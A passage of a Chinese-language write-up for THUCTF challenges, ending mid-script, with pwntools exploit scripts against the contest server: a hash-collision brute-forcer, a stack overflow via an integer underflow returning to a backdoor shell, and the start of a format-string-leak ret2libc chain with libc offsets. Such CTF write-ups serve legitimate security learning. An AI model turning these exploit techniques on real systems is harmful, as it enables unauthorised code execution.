<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-12"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-12--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">from</span><span style="color: #D6DEEB"> pwn </span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span></span>
<span></span>
<span><span style="color: #637777"># sh = process([&#39;python&#39;, &#39;cookie.py&#39;])</span></span>
<span><span style="color: #D6DEEB">sh </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">remote</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">chal.thuctf.redbud.info</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">50846</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">sendline</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">3</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">recvuntil</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">&lt;</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">curse </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> sh.</span><span style="color: #B2CCD6">recvuntil</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">&gt;</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">).</span><span style="color: #B2CCD6">split</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">,</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">[</span><span style="color: #F78C6C">0</span><span style="color: #D9F5DD">]</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">&gt;</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> curse</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">sh.</span><span style="color: #B2CCD6">recvall</span><span style="color: #D6DEEB">())</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">from</span><span style="color: #403F53"> pwn </span><span style="color: #994CC3">import</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span></span>
<span></span>
<span><span style="color: #989FB1"># sh = process([&#39;python&#39;, &#39;cookie.py&#39;])</span></span>
<span><span style="color: #403F53">sh </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">remote</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">chal.thuctf.redbud.info</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">50846</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">sendline</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">3</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">recvuntil</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">&lt;</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">curse </span><span style="color: #994CC3">=</span><span style="color: #403F53"> sh.</span><span style="color: #0C969B">recvuntil</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">&gt;</span><span style="color: #111111">&#39;</span><span style="color: #403F53">).</span><span style="color: #0C969B">split</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">,</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span><span style="color: #111111">[</span><span style="color: #AA0982">0</span><span style="color: #111111">]</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">&gt;</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> curse</span><span style="color: #403F53">)</span></span>
<span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">sh.</span><span style="color: #0C969B">recvall</span><span style="color: #403F53">())</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/cookie-flag3.6cb52f10.webp"><img srcset="/assets/cookie-flag3.5c49050d.png" loading="lazy" src="/assets/cookie-flag3.5c49050d.png" width="1268" height="118" alt="flag3"></picture></p>
<h3 id="another-v-me-50" class="heading"><a href="#another-v-me-50" class="heading-anchor" aria-label="章节： Another V ME 50" tabindex="-1"></a><span>Another V ME 50</span></h3>
<p>运行 &#x26; 阅读代码可知<span class="mojikumi-line-end">，</span>password 是 username 加盐的 sha256 的末尾<span class="mojikumi-line-end">，</span>获得 flag 就是要找到 hash collision<span class="mojikumi-line-end">，</span>然后按提示注册登录 buy flag 即可<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h4><ile-root id="ile-13"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-13--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">from</span><span style="color: #D6DEEB"> hashlib </span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> sha256</span></span>
<span></span>
<span><span style="color: #82AAFF">PREFIX</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">CryptoUserInfo</span><span style="color: #D9F5DD">&quot;</span></span>
<span><span style="color: #C792EA">def</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">get_token</span><span style="color: #D9F5DD">(</span><span style="color: #7FDBCA">byte</span><span style="color: #D6DEEB">: </span><span style="color: #C5E478">bytes</span><span style="color: #D9F5DD">)</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">return</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">sha256</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">PREFIX </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> byte</span><span style="color: #D6DEEB">).</span><span style="color: #B2CCD6">digest</span><span style="color: #D6DEEB">()</span><span style="color: #D9F5DD">[</span><span style="color: #C792EA">-</span><span style="color: #F78C6C">7</span><span style="color: #D6DEEB">:</span><span style="color: #D9F5DD">]</span></span>
<span></span>
<span><span style="color: #D6DEEB">tokens </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> {}</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">1000000000</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">    token </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">get_token</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">str</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">i</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">encode</span><span style="color: #D6DEEB">())</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> token </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> tokens:</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">i</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> tokens</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">token</span><span style="color: #D6DEEB">]</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> token.</span><span style="color: #B2CCD6">hex</span><span style="color: #D6DEEB">())</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">break</span></span>
<span><span style="color: #D6DEEB">    tokens[token] </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> i</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">from</span><span style="color: #403F53"> hashlib </span><span style="color: #994CC3">import</span><span style="color: #403F53"> sha256</span></span>
<span></span>
<span><span style="color: #4876D6">PREFIX</span><span style="color: #403F53"> </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&quot;</span><span style="color: #C96765">CryptoUserInfo</span><span style="color: #111111">&quot;</span></span>
<span><span style="color: #994CC3">def</span><span style="color: #403F53"> </span><span style="color: #4876D6">get_token</span><span style="color: #111111">(</span><span style="color: #0C969B">byte</span><span style="color: #403F53">: </span><span style="color: #4876D6">bytes</span><span style="color: #111111">)</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">return</span><span style="color: #403F53"> </span><span style="color: #0C969B">sha256</span><span style="color: #403F53">(</span><span style="color: #4876D6">PREFIX </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> byte</span><span style="color: #403F53">).</span><span style="color: #0C969B">digest</span><span style="color: #403F53">()</span><span style="color: #111111">[</span><span style="color: #994CC3">-</span><span style="color: #AA0982">7</span><span style="color: #403F53">:</span><span style="color: #111111">]</span></span>
<span></span>
<span><span style="color: #403F53">tokens </span><span style="color: #994CC3">=</span><span style="color: #403F53"> {}</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">1000000000</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">    token </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">get_token</span><span style="color: #403F53">(</span><span style="color: #4876D6">str</span><span style="color: #403F53">(</span><span style="color: #4876D6">i</span><span style="color: #403F53">)</span><span style="color: #4876D6">.</span><span style="color: #0C969B">encode</span><span style="color: #403F53">())</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">if</span><span style="color: #403F53"> token </span><span style="color: #994CC3">in</span><span style="color: #403F53"> tokens:</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">i</span><span style="color: #111111">,</span><span style="color: #4876D6"> tokens</span><span style="color: #403F53">[</span><span style="color: #4876D6">token</span><span style="color: #403F53">]</span><span style="color: #111111">,</span><span style="color: #4876D6"> token.</span><span style="color: #0C969B">hex</span><span style="color: #403F53">())</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">break</span></span>
<span><span style="color: #403F53">    tokens[token] </span><span style="color: #994CC3">=</span><span style="color: #403F53"> i</span></span></code></pre></div></section>
<p>运行得到 collision <code>117361489<wbr> <wbr>8567312<wbr> <wbr>7797a591e9c707</code><span class="mojikumi-line-end">。</span></p>
<p><picture><source type="image/webp" srcset="/assets/anothervme50-flag.933ace52.webp"><img srcset="/assets/anothervme50-flag.b5ad40c0.png" loading="lazy" src="/assets/anothervme50-flag.b5ad40c0.png" width="504" height="503" alt="flag"></picture></p>
<h2 id="pwn" class="heading"><a href="#pwn" class="heading-anchor" aria-label="章节： Pwn" tabindex="-1"></a><span>Pwn</span></h2>
<h3 id="测测你的网猫" class="heading"><a href="#测测你的网猫" class="heading-anchor" aria-label="章节： 测测你的网猫" tabindex="-1"></a><span>测测你的网猫</span></h3>
<p><picture><source type="image/webp" srcset="/assets/nc-flag.78daefb5.webp"><img srcset="/assets/nc-flag.63e5f590.png" loading="lazy" src="/assets/nc-flag.63e5f590.png" width="556" height="106" alt="flag"></picture></p>
<h3 id="babystack" class="heading"><a href="#babystack" class="heading-anchor" aria-label="章节： babystack" tabindex="-1"></a><span>babystack</span></h3>
<h4 id="level-1-8" class="heading"><a href="#level-1-8" class="heading-anchor" aria-label="章节： Level 1" tabindex="-1"></a><span>Level 1</span></h4>
<p>反编译发现它看似限制了输入长度<span class="mojikumi-line-end">，</span>但 <code>get_line</code> 函数的实现有问题<span class="mojikumi-line-end">，</span>长度输入 0 即可减法溢出而没有长度限制<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="C 代码块" data-v-ad49d235>C</h5><ile-root id="ile-14"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-14--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">void</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">get_line</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">long</span><span style="color: #D6DEEB"> </span><span style="color: #D7DBE0">param_1</span><span style="color: #D6DEEB">, </span><span style="color: #C792EA">int</span><span style="color: #D6DEEB"> </span><span style="color: #D7DBE0">param_2</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">{</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">char</span><span style="color: #D6DEEB"> </span><span style="color: #7FDBCA">*</span><span style="color: #D6DEEB">__buf;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">uint</span><span style="color: #D6DEEB"> uVar1;</span></span>
<span></span>
<span><span style="color: #D6DEEB">    uVar1 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">while</span><span style="color: #D6DEEB"> (</span><span style="color: #82AAFF">true</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    {</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (param_2 </span><span style="color: #7FDBCA">-</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #FFEB95">U</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">&lt;=</span><span style="color: #D6DEEB"> uVar1)</span></span>
<span><span style="color: #D6DEEB">        {</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">return</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">        }</span></span>
<span><span style="color: #D6DEEB">        __buf </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">char</span><span style="color: #D6DEEB"> </span><span style="color: #7FDBCA">*</span><span style="color: #D6DEEB">)((ulong)uVar1 </span><span style="color: #7FDBCA">+</span><span style="color: #D6DEEB"> param_1);</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #82AAFF">read(</span><span style="color: #F78C6C">0</span><span style="color: #82AAFF">, __buf, </span><span style="color: #F78C6C">1</span><span style="color: #82AAFF">)</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">        </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (</span><span style="color: #7FDBCA">*</span><span style="color: #D6DEEB">__buf </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #F78C6C">\n</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">            </span><span style="color: #C792EA">break</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">        uVar1 </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> uVar1 </span><span style="color: #7FDBCA">+</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">    }</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #7FDBCA">*</span><span style="color: #D6DEEB">__buf </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #F78C6C">\0</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">return</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">}</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">void</span><span style="color: #403F53"> </span><span style="color: #4876D6">get_line</span><span style="color: #403F53">(</span><span style="color: #994CC3">long</span><span style="color: #403F53"> param_1, </span><span style="color: #994CC3">int</span><span style="color: #403F53"> param_2)</span></span>
<span><span style="color: #403F53">{</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">char</span><span style="color: #403F53"> </span><span style="color: #0C969B">*</span><span style="color: #403F53">__buf;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">uint</span><span style="color: #403F53"> uVar1;</span></span>
<span></span>
<span><span style="color: #403F53">    uVar1 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #AA0982">0</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">while</span><span style="color: #403F53"> (</span><span style="color: #4876D6">true</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">    {</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (param_2 </span><span style="color: #0C969B">-</span><span style="color: #403F53"> </span><span style="color: #AA0982">1U</span><span style="color: #403F53"> </span><span style="color: #994CC3">&lt;=</span><span style="color: #403F53"> uVar1)</span></span>
<span><span style="color: #403F53">        {</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">return</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">        }</span></span>
<span><span style="color: #403F53">        __buf </span><span style="color: #994CC3">=</span><span style="color: #403F53"> (</span><span style="color: #994CC3">char</span><span style="color: #403F53"> </span><span style="color: #0C969B">*</span><span style="color: #403F53">)((ulong)uVar1 </span><span style="color: #0C969B">+</span><span style="color: #403F53"> param_1);</span></span>
<span><span style="color: #403F53">        </span><span style="color: #4876D6">read(</span><span style="color: #AA0982">0</span><span style="color: #4876D6">, __buf, </span><span style="color: #AA0982">1</span><span style="color: #4876D6">)</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">        </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (</span><span style="color: #0C969B">*</span><span style="color: #403F53">__buf </span><span style="color: #994CC3">==</span><span style="color: #403F53"> </span><span style="color: #111111">&#39;</span><span style="color: #AA0982">\n</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">            </span><span style="color: #994CC3">break</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">        uVar1 </span><span style="color: #994CC3">=</span><span style="color: #403F53"> uVar1 </span><span style="color: #0C969B">+</span><span style="color: #403F53"> </span><span style="color: #AA0982">1</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">    }</span></span>
<span><span style="color: #403F53">    </span><span style="color: #0C969B">*</span><span style="color: #403F53">__buf </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&#39;</span><span style="color: #AA0982">\0</span><span style="color: #111111">&#39;</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">    </span><span style="color: #994CC3">return</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">}</span></span></code></pre></div></section>
<p>栈溢出到返回地址<span class="mojikumi-line-end">，</span>返回到 <code>backdoor</code> 即可 get shell<span class="mojikumi-line-end">，</span>然后 <code>cat /flag</code> 获得 flag<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-15"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-15--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">from</span><span style="color: #D6DEEB"> pwn </span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span></span>
<span></span>
<span><span style="color: #637777"># sh = process(&#39;./babystack&#39;)</span></span>
<span><span style="color: #D6DEEB">sh </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">remote</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">chal.thuctf.redbud.info</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">50395</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">included!)</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">0</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">payload </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #B2CCD6">p64</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">4011be</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">*</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">10</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">sendlineafter</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">b</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">string:</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> payload</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">sh.</span><span style="color: #B2CCD6">interactive</span><span style="color: #D6DEEB">()</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">from</span><span style="color: #403F53"> pwn </span><span style="color: #994CC3">import</span><span style="color: #403F53"> </span><span style="color: #994CC3">*</span></span>
<span></span>
<span><span style="color: #989FB1"># sh = process(&#39;./babystack&#39;)</span></span>
<span><span style="color: #403F53">sh </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">remote</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">chal.thuctf.redbud.info</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">50395</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">included!)</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">0</span><span style="color: #111111">&#39;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">payload </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #0C969B">p64</span><span style="color: #403F53">(</span><span style="color: #994CC3">0x</span><span style="color: #AA0982">4011be</span><span style="color: #403F53">) </span><span style="color: #994CC3">*</span><span style="color: #403F53"> </span><span style="color: #994CC3">0x</span><span style="color: #AA0982">10</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">sendlineafter</span><span style="color: #403F53">(</span><span style="color: #994CC3">b</span><span style="color: #111111">&#39;</span><span style="color: #C96765">string:</span><span style="color: #111111">&#39;</span><span style="color: #111111">,</span><span style="color: #4876D6"> payload</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">sh.</span><span style="color: #0C969B">interactive</span><span style="color: #403F53">()</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/babystack-flag1.38042202.webp"><img srcset="/assets/babystack-flag1.ed85d014.png" loading="lazy" src="/assets/babystack-flag1.ed85d014.png" width="791" height="163" alt="flag1"></picture></p>
<h4 id="level-2-6" class="heading"><a href="#level-2-6" class="heading-anchor" aria-label="章节： Level 2" tabindex="-1"></a><span>Level 2</span></h4>
<p>代码中 <code>printf</code> 的 format string 可控制<span class="mojikumi-line-end">，</span>从而可以泄露出 libc 的地址<span class="mojikumi-line-end">，</span>然后就可以 ret2libc<span class="mojikumi-line-end">。</span></p>
<p><code>/bin/sh</code><span class="mojikumi-line-end">、</span><code>system</code><span class="mojikumi-line-end">、</span><code>pop %rdi</code> 的地址是用 <code>objdump</code> 在 <code>libc.so.6</code> 里找到的<span class="mojikumi-line-end">，</span><code>offset</code> 以及 <code>%25$p</code> 可以运行一下试出来<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-16"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-16--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">from</span><span style="color: #D6DEEB"> pwn </span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">*</span></span>
<span></span>
<span><span style="color: #D6DEEB">binsh </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">1d8698</span></span>
<span><span style="color: #D6DEEB">system </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">508f2</span></span>
<span><span style="color: #D6DEEB">poprdi </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">0x</span><span style="color: #F78C6C">2a3e5</span></span>
<span><span style="color: #D6DEEB">offset </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">-0x</span><span style="color: #F78C6C">29d90</span></span>
<span></span>
